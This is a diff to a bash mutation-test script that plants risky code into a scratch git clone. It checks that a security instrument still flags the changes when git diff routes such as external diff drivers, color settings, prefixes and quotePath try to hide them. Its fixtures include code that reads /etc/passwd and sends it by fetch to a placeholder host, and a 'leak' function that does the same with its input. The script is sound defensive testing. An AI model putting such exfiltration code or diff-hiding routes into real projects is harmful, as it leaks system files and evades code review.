@@ -22,10 +22,21 @@
 # Each plant names the files it edits. `mk` refuses it (exit 2, naming the plant) unless `git diff --name-only` of the
 #   plant is exactly those files, so a plant that applies only in part never runs under its full label (QE-182-a).
 # Exit 0: every row as expected and limbs 2 and 3 identical. Exit 1: names each mismatched plant (limb 1) and each
-#   differing plant and limb (2, 3). Exit 2: usage, or a plant did not apply to <tip> exactly as named.
+#   differing plant and limb (2, 3). Exit 2: usage, or a plant did not apply to <tip> exactly as named, or a route was
+#   left in the clone.
 # G1-IMP, G1-GRD, G1B, UNC1 and REN are deletion-only in a limb-1 holder (`AR-163-DELONLY`, closed by ABC-188): each
 #   FIRES on the instrument from ABC-188, and none fires on the one before it. BIN-NUL and BIN-ATTR each FIRE on the
 #   instrument from ABC-191 (its diff reads `--text --no-textconv`), and neither fires on the one before it.
+# ABC-193 (AR-191-GITENV, AR-191-QUOTEPATH) adds eight rows, 20 in all. ADD, a control with no route, gives src/fen.ts
+#   a node:fs import and a fetch call (Security/NFR's ADD plant). G-COLOR, G-EXT, G-ENV, G-DRV and G-PFX are ADD's
+#   plant with one git route each. The route is set in this clone's own config (for G-ENV, in the run's environment)
+#   around the head instrument's runs only, and removed before the 341da4c1 runs, so their limbs 2 and 3 are compared
+#   with 341da4c1 on the same plant, route off. QU (an unreached src/qé.ts with node:fs) and QE2 (a reached src/qé.ts
+#   gaining node:fs and fetch) compare limbs 2 and 3 with 341da4c1 run with core.quotePath=false in its environment.
+#   All eight FIRE on the instrument from ABC-193 (every git call reads `-c core.quotePath=false`; its diff reads
+#   `--no-ext-diff --no-color --src-prefix=a/ --dst-prefix=b/`); on the one before it only ADD fires. `mk` reads names
+#   with core.quotePath=false. After the last row the script exits 2 if the clone still holds a color.* or diff.* key
+#   or a .git/info/attributes.
 set -e
 [ $# -eq 4 ] && [ -f "$4" ] || { echo "usage: r2-mutants.sh <repo> <tip> <scratch-dir> <absolute path to clause-b.mjs>" >&2; exit 2; }
 REPO=$1; TIP=$2; mkdir -p "$3"; SC=$(cd "$3" && pwd); X=$SC/r2-mutants-clone; R=$SC/r2-mutants-ref; S=$4
@@ -40,7 +51,7 @@ T=$(git rev-parse --short=8 HEAD); H=src/book-file.ts
 echo "tip $T; instrument sha256 $(shasum -a 256 "$S" | cut -c1-16); reference $REF sha256 $(shasum -a 256 "$O" | cut -c1-16)"
 # mk <plant> <file>...: commit the plant if the files it changed are exactly <file>... (QE-182-a), else exit 2.
 mk() { local p=$1 got want; shift; git add -A >/dev/null
-  got=$(git diff --cached --name-only --no-renames | LC_ALL=C sort | paste -sd ' ' -)
+  got=$(git -c core.quotePath=false diff --cached --name-only --no-renames | LC_ALL=C sort | paste -sd ' ' -)
   want=$(printf '%s\n' "$@" | LC_ALL=C sort | paste -sd ' ' -)
   [ "$got" = "$want" ] || { echo "plant $p did not apply at $(git rev-parse --short=8 HEAD): changed [$got], names [$want]" >&2; exit 2; }
   git commit -qm "$p"; git rev-parse --short=8 HEAD; }
@@ -48,11 +59,26 @@ ed() { perl -0pi -e "$2" "$1"; }   # one in-place edit; mk checks the plant's fi
 BAD=""; DIFF=""; XR=()
 # mask: the plant ids in the `diff <base>..<head> = …` line only (ABC-191).
 mask() { sed -E '/^  diff /s/\.\.[0-9a-f]+/..<plant>/g'; }
-# row <plant> <base> <head> <expected verdict> <expected Ruling 2 files, or -> <note> [X1]
+# rt <plant> <mode> on|off (ABC-193): with mode `route`, set the plant's git route (on) or remove every route (off).
+#   Only around the head instrument's runs; the routes live in this clone's .git or this shell's environment.
+NOP=$R/nop.sh; printf '#!/bin/sh\nexit 0\n' > "$NOP"; chmod +x "$NOP"; GA=$(git rev-parse --git-path info/attributes)
+rt() { [ "$2" = route ] || return 0
+  if [ "$3" = off ]; then unset GIT_EXTERNAL_DIFF; rm -f "$GA"
+    for k in color diff diff.ext; do git config --remove-section $k 2>/dev/null || true; done; return 0; fi
+  case $1 in
+    G-COLOR) git config color.diff always;;
+    G-EXT) git config diff.external "$NOP";;
+    G-ENV) export GIT_EXTERNAL_DIFF=$NOP;;
+    G-DRV) git config diff.ext.command "$NOP"; mkdir -p "$(dirname "$GA")"; printf 'src/** diff=ext\n' > "$GA";;
+    G-PFX) git config diff.srcPrefix x/; git config diff.dstPrefix y/;;
+  esac; }
+# row <plant> <base> <head> <expected verdict> <expected Ruling 2 files, or -> <note> [X1|route|QP]
 #   X1's row keeps 341da4c1's limbs 2 and 3 on X1, masked, in XR. With the last argument X1, limbs 2 and 3 are
-#   compared with that, masked, instead of with 341da4c1 on the same plant (BIN-NUL, BIN-ATTR).
+#   compared with that, masked, instead of with 341da4c1 on the same plant (BIN-NUL, BIN-ATTR). With `route`, the
+#   plant's route (named by the plant) is on for the head instrument's runs only. With `QP`, 341da4c1 runs with
+#   core.quotePath=false in its environment.
 row() { local o v r2 fl got want l a b lo ro rn
-  o=$(node "$S" "$2" "$3" 1)
+  rt "$1" "${7:-}" on; o=$(node "$S" "$2" "$3" 1); rt "$1" "${7:-}" off
   v=$(grep -E '^  limb 1: ' <<<"$o" | sed 's/^  limb 1: //')
   r2=$(grep -F '  (b1) Ruling 2 ' <<<"$o" | sed 's/^[^:]*: //' || true)
   fl=$(awk '/^  \(b1\) Ruling 2 /{f=1;next} f&&/^      /{print;next} {f=0}' <<<"$o" |
@@ -62,8 +88,11 @@ row() { local o v r2 fl got want l a b lo ro rn
   printf '%-7s %s..%s  %s\n        L1 expected  %s\n        L1 actual    %s   %s\n' "$1" "$2" "$3" "$6" "$want" "$got" "$a"
   printf '        (b1) capability: %s | (b1) Ruling 2: %s\n' "$(grep -F '  (b1) capability ' <<<"$o" | sed 's/.*: //')" "${r2:-(no such line)}"
   awk '/^  \(b1\) Ruling 2 /{f=1;next} f&&/^      /{sub(/^ +/,""); print "        R2 file      " $0; next} {f=0}' <<<"$o"
-  for l in 2 3; do lo=$(node "$S" "$2" "$3" $l)
+  for l in 2 3; do rt "$1" "${7:-}" on; lo=$(node "$S" "$2" "$3" $l); rt "$1" "${7:-}" off
     if [ "${7:-}" = X1 ]; then lo=$(mask <<<"$lo"); ro=${XR[$l]}; rn="$REF on X1, plant ids masked"
+    elif [ "${7:-}" = QP ]; then rn="$REF with core.quotePath=false in its environment"
+      ro=$(GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.quotePath GIT_CONFIG_VALUE_0=false node "$O" "$2" "$3" $l)
+    elif [ "${7:-}" = route ]; then ro=$(node "$O" "$2" "$3" $l); rn="$REF, route off"
     else ro=$(node "$O" "$2" "$3" $l); rn=$REF; fi
     if [ "$1" = X1 ]; then XR[$l]=$(mask <<<"$ro"); fi
     if [ "$lo" = "$ro" ]; then b=identical; else b=DIFFERS; DIFF="$DIFF $1:limb$l"; fi
@@ -116,7 +145,28 @@ M=$(mk BIN-NUL $H); row BIN-NUL $T $M FIRES "src/book-file.ts@<base>" "AR-188-BI
 ed $H 's|import \{ readFileSync \} from "node:fs";\n\n||; s|return readFileSync\([^\n]*\);|return new Uint8Array(0);|'
 printf 'src/** -diff\n' > .gitattributes
 M=$(mk BIN-ATTR $H .gitattributes); row BIN-ATTR $T $M FIRES "src/book-file.ts@<base>" "AR-188-BINARY: X1 plus .gitattributes src/** -diff" X1; git reset -q --hard $T
-[ -z "$BAD" ] && [ -z "$DIFF" ] && { echo "r2-mutants: 12 of 12 limb-1 rows as expected; limbs 2 and 3 identical to $REF on the same plant on 10 of 10, and to $REF on X1 (plant ids masked) on BIN-NUL and BIN-ATTR"; exit 0; }
+# ADD (ABC-193, a control with no route; Security/NFR's ADD plant): src/fen.ts gains a node:fs import and an exported
+#   function that calls writeFileSync and fetch.
+ed src/fen.ts 's|\A|import { writeFileSync } from "node:fs";\nexport const leak = (s: string) => { writeFileSync("/tmp/x", s); return fetch("http://example.invalid/" + s); };\n|'
+M=$(mk ADD src/fen.ts); row ADD $T $M FIRES "src/fen.ts@<head>" "src/fen.ts gains node:fs + fetch; no route"
+# G-COLOR, G-EXT, G-ENV, G-DRV, G-PFX (ABC-193, AR-191-GITENV): ADD's plant, with the row's route on for the head runs.
+row G-COLOR $T $M FIRES "src/fen.ts@<head>" "ADD's plant; route color.diff=always" route
+row G-EXT $T $M FIRES "src/fen.ts@<head>" "ADD's plant; route diff.external = a script that prints nothing" route
+row G-ENV $T $M FIRES "src/fen.ts@<head>" "ADD's plant; route GIT_EXTERNAL_DIFF = the same script" route
+row G-DRV $T $M FIRES "src/fen.ts@<head>" "ADD's plant; route diff.ext.command = the same script, .git/info/attributes src/** diff=ext" route
+row G-PFX $T $M FIRES "src/fen.ts@<head>" "ADD's plant; route diff.srcPrefix=x/, diff.dstPrefix=y/" route; git reset -q --hard $T
+# QU (ABC-193, AR-191-QUOTEPATH): a new, unreached src/qé.ts holding a node:fs import.
+printf 'import { readFileSync } from "node:fs";\nexport const r = () => readFileSync("/etc/passwd");\n' > src/qé.ts
+M=$(mk QU src/qé.ts); row QU $T $M FIRES "src/qé.ts@<head>" "new unreached src/qé.ts with node:fs" QP; git reset -q --hard $T
+# QE2 (ABC-193, AR-191-QUOTEPATH; two commits): base adds a benign src/qé.ts that src/cli.ts imports; head gives it a
+#   node:fs import and a fetch call.
+printf 'export const q = () => 1;\n' > src/qé.ts; ed src/cli.ts 's|\A|import "./qé.ts";\n|'
+B=$(mk QE2-base src/cli.ts src/qé.ts)
+printf 'import { readFileSync } from "node:fs";\nexport const q = () => 1;\nexport const r = () => fetch("http://example.invalid/" + String(readFileSync("/etc/passwd")));\n' > src/qé.ts
+M=$(mk QE2 src/qé.ts); row QE2 $B $M FIRES "src/qé.ts@<head>" "reached src/qé.ts gains node:fs + fetch" QP; git reset -q --hard $T
+if git config --local --get-regexp '^(color|diff)\.' >/dev/null || [ -e "$GA" ]; then
+  echo "r2-mutants: a route was left in the clone $X (a color.* or diff.* key, or $GA)" >&2; exit 2; fi
+[ -z "$BAD" ] && [ -z "$DIFF" ] && { echo "r2-mutants: 20 of 20 limb-1 rows as expected; limbs 2 and 3 identical to $REF on the same plant on 11 of 11, on the same plant with the route off on G-COLOR G-EXT G-ENV G-DRV G-PFX, with core.quotePath=false in its environment on QU and QE2, and on X1 (plant ids masked) on BIN-NUL and BIN-ATTR"; exit 0; }
 [ -n "$BAD" ] && echo "r2-mutants: limb 1 MISMATCH:$BAD"
-[ -n "$DIFF" ] && echo "r2-mutants: limbs 2/3 DIFFER from $REF (on the same plant; on X1 for BIN-NUL and BIN-ATTR):$DIFF"
+[ -n "$DIFF" ] && echo "r2-mutants: limbs 2/3 DIFFER from $REF (on the same plant, route off on the route rows, core.quotePath=false on QU and QE2; on X1 for BIN-NUL and BIN-ATTR):$DIFF"
 exit 1
